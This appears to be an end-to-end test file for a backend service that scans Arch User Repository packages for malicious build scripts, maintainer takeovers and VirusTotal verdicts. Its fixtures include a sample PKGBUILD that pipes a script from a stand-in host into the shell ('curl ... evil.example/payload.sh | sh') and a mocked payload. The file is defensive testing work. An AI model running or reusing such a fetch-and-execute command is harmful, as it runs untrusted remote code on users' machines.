import 'reflect-metadata';

import { CACHE_MANAGER } from '@nestjs/cache-manager';
import type { Cache } from 'cache-manager';
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi, type Mock } from 'vitest';
import { AurMaintainerSnapshot } from '@chaotic-next/backend/diff-scan/aur-maintainer-snapshot.entity';
import { AurScanService } from '@chaotic-next/backend/diff-scan/aur-scan.service';
import { VirusTotalVerdict } from '@chaotic-next/backend/diff-scan/virus-total-verdict.entity';
import { GitlabService } from '@chaotic-next/backend/gitlab/gitlab.service';
import { createE2eApp, type E2eApp } from '../test/e2e-app';

const NOW_SECONDS = Math.floor(Date.now() / 1000);
const DAY_SECONDS = 24 * 60 * 60;

// Produces rule findings without any URL, so the scan settles without VirusTotal.
const PKGBUILD_WITHOUT_URLS = [
  'pkgname=evilpkg',
  'source=("helper.install")',
  'build() {',
  '  npm install atomic-lockfile',
  '}',
].join('\n');

// Produces a non-reputable URL and a sha256 file indicator for the VirusTotal flow.
const PKGBUILD_WITH_INDICATORS = [
  'pkgname=evilpkg',
  'source=("https://evil.example/payload.sh")',
  'sha256sums=(' + 'a'.repeat(64) + ')',
  'build() {',
  '  curl -s https://evil.example/payload.sh | sh',
  '}',
].join('\n');

const VT_STATS = { malicious: 5, suspicious: 1, undetected: 60, harmless: 10, timeout: 0 };

function jsonResponse(body: unknown): Response {
  return new Response(JSON.stringify(body), { status: 200, headers: { 'content-type': 'application/json' } });
}

function aurFetch(info: Record<string, unknown>, pkgbuild: string): Mock<typeof fetch> {
  return vi.fn(async (input: RequestInfo | URL) => {
    const url = String(input);
    if (url.includes('rpc/v5/info')) return jsonResponse({ results: [info] });
    if (url.includes('by=maintainer')) {
      const username = decodeURIComponent(url.split('arg=')[1] ?? '');
      const established = username === 'oldmaintainer';
      return jsonResponse({
        results: established
          ? [{ Name: `${username}-other`, FirstSubmitted: NOW_SECONDS - 5 * 365 * DAY_SECONDS, NumVotes: 40 }]
          : [],
      });
    }
    if (url.endsWith('/PKGBUILD?h=evilpkg')) {
      return new Response(pkgbuild, { status: 200, headers: { 'content-type': 'text/plain' } });
    }
    if (url.includes('helper.install')) {
      return new Response('post_install() {\n  npm install atomic-lockfile\n}\n', {
        status: 200,
        headers: { 'content-type': 'text/plain' },
      });
    }
    if (url.includes('payload.sh')) {
      return new Response('#!/bin/sh\nid > /tmp/pwned\n', { status: 200, headers: { 'content-type': 'text/plain' } });
    }
    if (url.includes('virustotal.com/api/v3/urls')) return jsonResponse({ data: { id: 'e2e-analysis' } });
    if (url.includes('virustotal.com/api/v3/analyses/')) {
      return jsonResponse({ data: { attributes: { status: 'completed', stats: VT_STATS } } });
    }
    if (url.includes('virustotal.com/api/v3/files/')) return new Response('unknown', { status: 404 });
    return new Response('not found', { status: 404 });
  });
}

function infoWith(maintainer: string, firstSubmittedSecondsAgo = 3 * 365 * DAY_SECONDS): Record<string, unknown> {
  return {
    Name: 'evilpkg',
    PackageBase: 'evilpkg',
    Maintainer: maintainer,
    NumVotes: 7,
    Popularity: 1.5,
    FirstSubmitted: NOW_SECONDS - firstSubmittedSecondsAgo,
  };
}

describe('AUR package scan (e2e, real PostgreSQL, mocked AUR and VirusTotal upstream)', () => {
  let e2e: E2eApp;
  let fetchMock: Mock<typeof fetch>;
  let cache: Cache;

  beforeAll(async () => {
    const realFetch = globalThis.fetch;
    fetchMock = aurFetch(infoWith('oldmaintainer'), PKGBUILD_WITHOUT_URLS);
    vi.stubGlobal('fetch', async (input: RequestInfo | URL, init?: RequestInit) => {
      const url = String(input);
      const mocked =
        url.includes('aur.archlinux.org') || url.includes('evil.example') || url.includes('virustotal.com');
      return mocked ? fetchMock(input, init) : realFetch(input, init);
    });

    e2e = await createE2eApp();
    cache = e2e.app.get<Cache>(CACHE_MANAGER);
  });

  afterAll(async () => {
    await e2e.close();
    vi.unstubAllGlobals();
  });

  beforeEach(async () => {
    await e2e.dataSource.getRepository(AurMaintainerSnapshot).clear();
    await e2e.dataSource.getRepository(VirusTotalVerdict).clear();
    await cache.clear();
    e2e.app.get(AurScanService).clearAurCache();
  });

  it('rejects a scan request without a package name (400)', async () => {
    const res = await e2e.inject({ method: 'POST', url: '/gitlab/aur-scan', payload: {} });
    expect(res.statusCode).toBe(400);
  });

  it('scans the package end to end and persists the maintainer baseline', async () => {
    const res = await e2e.inject({ method: 'POST', url: '/gitlab/aur-scan', payload: { package: 'evilpkg' } });

    expect(res.statusCode).toBe(201);
    const scan = (await res.json()) as {
      status: string;
      findings: unknown[];
      scannedFiles: string[];
      maintainers: { username: string; novice: boolean }[];
      maintainerChange?: { added: string[] };
      packageMeta: { votes: number; orphaned: boolean };
    };
    expect(scan.status).toBe('done');
    expect(scan.scannedFiles).toEqual(['PKGBUILD', 'helper.install']);
    expect(scan.findings.length).toBeGreaterThan(0);
    expect(scan.maintainers).toEqual([expect.objectContaining({ username: 'oldmaintainer', novice: false })]);
    expect(scan.maintainerChange).toBeUndefined();
    expect(scan.packageMeta.votes).toBe(7);

    const snapshot = await e2e.dataSource.getRepository(AurMaintainerSnapshot).findOneBy({ packageName: 'evilpkg' });
    expect(snapshot?.maintainers).toEqual(['oldmaintainer']);

    const cached = await e2e.inject({ method: 'GET', url: '/gitlab/aur-scan/evilpkg' });
    expect(cached.statusCode).toBe(200);
    expect(((await cached.json()) as { findings: unknown[] }).findings.length).toBeGreaterThan(0);
  });

  it('reports a maintainer takeover against the persisted snapshot', async () => {
    await e2e.inject({ method: 'POST', url: '/gitlab/aur-scan', payload: { package: 'evilpkg' } });
    fetchMock.mockImplementation(aurFetch(infoWith('stranger', 10 * DAY_SECONDS), PKGBUILD_WITHOUT_URLS) as never);
    e2e.app.get(AurScanService).clearAurCache();

    const res = await e2e.inject({ method: 'POST', url: '/gitlab/aur-scan', payload: { package: 'evilpkg' } });
    const scan = (await res.json()) as {
      maintainers: { username: string; novice: boolean }[];
      maintainerChange?: { added: string[]; removed: string[] };
    };

    expect(res.statusCode).toBe(201);
    expect(scan.maintainers).toEqual([expect.objectContaining({ username: 'stranger', novice: true })]);
    expect(scan.maintainerChange?.added).toEqual(['stranger']);
    expect(scan.maintainerChange?.removed).toEqual(['oldmaintainer']);

    const snapshot = await e2e.dataSource.getRepository(AurMaintainerSnapshot).findOneBy({ packageName: 'evilpkg' });
    expect(snapshot?.maintainers).toEqual(['stranger']);
  });

  it('checks indicators on VirusTotal, maps verdicts and persists them', async () => {
    fetchMock.mockImplementation(aurFetch(infoWith('oldmaintainer'), PKGBUILD_WITH_INDICATORS) as never);

    const res = await e2e.inject({ method: 'POST', url: '/gitlab/aur-scan', payload: { package: 'evilpkg' } });
    const initial = (await res.json()) as { status: string; vtPending: number };
    expect(initial.status).toBe('awaiting-vt');
    expect(initial.vtPending).toBe(2);

    await vi.waitFor(
      async () => {
        const polled = await e2e.inject({ method: 'GET', url: '/gitlab/aur-scan/evilpkg' });
        expect(((await polled.json()) as { status: string }).status).toBe('done');
      },
      { timeout: 5000, interval: 100 },
    );

    const settled = await e2e.inject({ method: 'GET', url: '/gitlab/aur-scan/evilpkg' });
    const scan = (await settled.json()) as {
      vtReports: { type: string; value: string; verdict: string; stats?: typeof VT_STATS }[];
    };
    const urlReport = scan.vtReports.find((report) => report.type === 'url');
    expect(urlReport?.value).toBe('https://evil.example/payload.sh');
    expect(urlReport?.verdict).toBe('malicious');
    expect(urlReport?.stats).toEqual(VT_STATS);
    const fileReport = scan.vtReports.find((report) => report.type === 'file');
    expect(fileReport?.verdict).toBe('unknown');

    const verdicts = await e2e.dataSource.getRepository(VirusTotalVerdict).find();
    expect(verdicts).toHaveLength(1);
    expect(verdicts[0]).toMatchObject({
      type: 'url',
      value: 'https://evil.example/payload.sh',
      verdict: 'malicious',
      malicious: 5,
      suspicious: 1,
      undetected: 60,
      harmless: 10,
      timeout: 0,
    });
  });

  it('streams a settled scan as one complete SSE message', async () => {
    await e2e.inject({ method: 'POST', url: '/gitlab/aur-scan', payload: { package: 'evilpkg' } });

    // @Sse needs a real socket (inject's mock socket lacks setKeepAlive).
    const address = e2e.app.getHttpServer().address() as { port: number };
    const res = await fetch(`http://127.0.0.1:${address.port}/gitlab/aur-scan/evilpkg/stream`);
    const body = await res.text();

    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toContain('text/event-stream');
    const messages = body
      .split('\n')
      .filter((line) => line.startsWith('data: '))
      .map((line) => JSON.parse(line.slice(6)) as { scan: { packageName: string }; complete: boolean });
    expect(messages).toHaveLength(1);
    expect(messages[0].scan.packageName).toBe('evilpkg');
    expect(messages[0].complete).toBe(true);
  });

  it('answers 404 for scans that never ran', async () => {
    const res = await e2e.inject({ method: 'GET', url: '/gitlab/aur-scan/never-scanned' });
    expect(res.statusCode).toBe(404);
  });

  it('triggers the MR scan via POST /gitlab/mr-scan', async () => {
    const gitlabService = e2e.app.get(GitlabService);
    const refreshSpy = vi.spyOn(gitlabService, 'handleAutoFlagRefresh').mockResolvedValue(undefined);

    const res = await e2e.inject({
      method: 'POST',
      url: '/gitlab/mr-scan',
      payload: {},
      headers: { 'x-test-user-groups': 'chaotic-aur' },
    });

    expect(res.statusCode).toBe(201);
    expect(refreshSpy).toHaveBeenCalledTimes(1);
  });
});
